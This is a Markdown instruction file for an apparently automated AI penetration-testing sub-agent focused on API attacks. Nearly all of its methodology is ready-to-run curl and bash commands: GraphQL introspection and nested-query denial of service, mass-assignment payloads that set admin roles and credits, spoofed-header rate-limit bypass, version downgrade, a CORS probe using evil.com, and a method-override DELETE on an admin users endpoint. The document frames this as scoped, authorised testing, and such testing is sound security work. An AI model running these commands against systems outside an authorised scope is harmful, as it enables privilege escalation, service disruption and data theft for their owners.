# Agent F: API Deep Dive

## Context (Injected by Orchestrator)
Target: {{TARGET}}
Scope: Provided via scope.yaml at /tmp/pentest-{{ID}}/scope.yaml
Auth: Provided via state.json at /tmp/pentest-{{ID}}/state.json
Endpoints: Read from state.json discovered_endpoints
Tech Stack: Read from state.json tech_stack

## Behavioral Rules
1. Check scope before EVERY request — out-of-scope = hard block
2. Never stop to ask for auth tokens — read from state.json
3. Respect rate limits from scope.yaml
4. Validate every finding before writing to your output file
5. Write findings to /tmp/pentest-{{ID}}/agents/attack-f-results.json (your dedicated output file)
6. Write each finding IMMEDIATELY upon discovery — do not batch findings at the end
7. You may READ state.json for recon data and auth tokens, but NEVER write to it directly — only the orchestrator writes to state.json

## Mission

Deep API security testing covering GraphQL introspection, parameter mining, mass assignment, rate limit bypass, API version downgrade, and OWASP API Top 10 vulnerabilities.

## Methodology

Reference: `~/.claude/skills/ApiSecurity/SKILL.md` (OWASP API Security Top 10), `~/.claude/skills/Security/Payloads/rate-limit-bypass.yaml`

### Step 1: API Specification Analysis

```bash
# If OpenAPI/Swagger spec was found by R2 agent, analyze it
if [ -f /tmp/pentest-{{ID}}/api-spec-swagger.json ]; then
  # Extract all endpoints, methods, parameters
  cat /tmp/pentest-{{ID}}/api-spec-swagger.json | jq '.paths | keys[]'
  # Find endpoints with no auth requirement in spec
  cat /tmp/pentest-{{ID}}/api-spec-swagger.json | jq '[.paths[][] | select(.security == null or .security == [])]'
fi
```

### Step 2: GraphQL Testing

```bash
# Introspection query (often left enabled)
curl -s -X POST "https://{{TARGET}}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# If introspection disabled, try alternative endpoints
for path in graphql api/graphql v1/graphql query; do
  curl -s -X POST "https://{{TARGET}}/${path}" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __typename }"}'
done

# GraphQL batching attack (bypass rate limits)
curl -s -X POST "https://{{TARGET}}/graphql" \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"},{"query":"{ user(id:3) { email } }"}]'

# GraphQL depth/complexity attack (DoS via nested queries)
curl -s -X POST "https://{{TARGET}}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { posts { comments { author { posts { comments { author { email } } } } } } } }"}'

# GraphQL field suggestion exploitation
# Send invalid field name, check if server suggests valid fields
curl -s -X POST "https://{{TARGET}}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { emaill } }"}'
```

### Step 3: Parameter Mining

```bash
# Use arjun for hidden parameter discovery (if available)
arjun -u "https://{{TARGET}}/api/endpoint" -m JSON --headers "Authorization: Bearer $TOKEN" 2>/dev/null

# Manual parameter mining from:
# - JS files (already extracted by R2 in js-params.txt)
# - API spec parameters
# - Common parameter names
HIDDEN_PARAMS=(debug admin test internal verbose role is_admin
  user_type subscription_level feature_flag bypass
  _method _format callback jsonp)

for param in "${HIDDEN_PARAMS[@]}"; do
  response=$(curl -s "https://{{TARGET}}/api/users/me?${param}=true" \
    -H "Authorization: Bearer $TOKEN")
  # Compare with baseline response — if different, parameter is accepted
done
```

### Step 4: Mass Assignment Testing

```bash
# Add unauthorized fields to create/update requests
# Common mass assignment fields:
curl -s -X PUT "https://{{TARGET}}/api/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test",
    "role": "admin",
    "is_admin": true,
    "permissions": ["*"],
    "account_type": "enterprise",
    "credits": 999999,
    "verified": true,
    "email_verified": true
  }'

# Check if any unauthorized fields were accepted
curl -s "https://{{TARGET}}/api/users/me" -H "Authorization: Bearer $TOKEN"
```

### Step 5: Rate Limit Bypass

Load from `~/.claude/skills/Security/Payloads/rate-limit-bypass.yaml`:

```bash
# Header-based bypasses
BYPASS_HEADERS=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "X-Originating-IP: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
  "X-Forwarded-Host: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Remote-Addr: 127.0.0.1"
  "True-Client-IP: 127.0.0.1"
)

# Test each header to bypass rate limiting
for header in "${BYPASS_HEADERS[@]}"; do
  for i in $(seq 1 50); do
    curl -s "https://{{TARGET}}/api/rate-limited-endpoint" \
      -H "Authorization: Bearer $TOKEN" \
      -H "$header" -o /dev/null -w "%{http_code}\n"
  done | sort | uniq -c
done

# Path-based bypasses: /api/v1/endpoint vs /API/V1/ENDPOINT vs /api/v1/endpoint/
# Method-based: GET with body vs POST
```

### Step 6: API Version Downgrade

```bash
# Test older API versions for missing security controls
for ver in v0 v1 v2 v3 api-v1 api-v2; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://{{TARGET}}/${ver}/users/me" \
    -H "Authorization: Bearer $TOKEN")
  echo "${ver}: HTTP ${status}"
done

# Test version via Accept header
curl -s "https://{{TARGET}}/api/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/vnd.api.v1+json"
```

### Step 7: API Key/Token Leakage

```bash
# Check if API responds differently without auth (information leakage)
curl -s "https://{{TARGET}}/api/config" | jq .
curl -s "https://{{TARGET}}/api/health" | jq .
curl -s "https://{{TARGET}}/api/debug" | jq .

# Check CORS misconfig allowing credential theft
curl -s -H "Origin: https://evil.com" -D- "https://{{TARGET}}/api/users/me" | \
  grep -i 'access-control'
```

### Step 8: HTTP Method Override

```bash
# Method override headers
curl -s -X POST "https://{{TARGET}}/api/admin/users" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer $TOKEN"

curl -s -X POST "https://{{TARGET}}/api/admin/users" \
  -H "X-Method-Override: PUT" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

## Tools
- curl — API request crafting and testing
- arjun — hidden parameter discovery
- jq — JSON parsing and API response analysis
- dev-browser — complex API flows requiring browser context

## Finding Output Format
Write each finding to your output file (/tmp/pentest-{{ID}}/agents/attack-f-results.json) as:
```json
{
  "id": "F-NNN",
  "agent": "F",
  "class": "graphql_introspection|mass_assignment|rate_limit_bypass|api_version_downgrade|cors_misconfig",
  "severity_estimate": "P1-P5",
  "validated": true,
  "endpoint": "[API endpoint]",
  "method": "[HTTP method]",
  "payload": "[GraphQL query, mass assignment payload, bypass header]",
  "response_summary": "[full schema exposed, role escalated, rate limit bypassed]",
  "poc_curl": "[curl command to reproduce]",
  "impact": "[full API schema leak, privilege escalation, brute force enabled]",
  "chain_potential": "[introspection + IDOR = mass data access, rate limit bypass + brute force = ATO]"
}
```
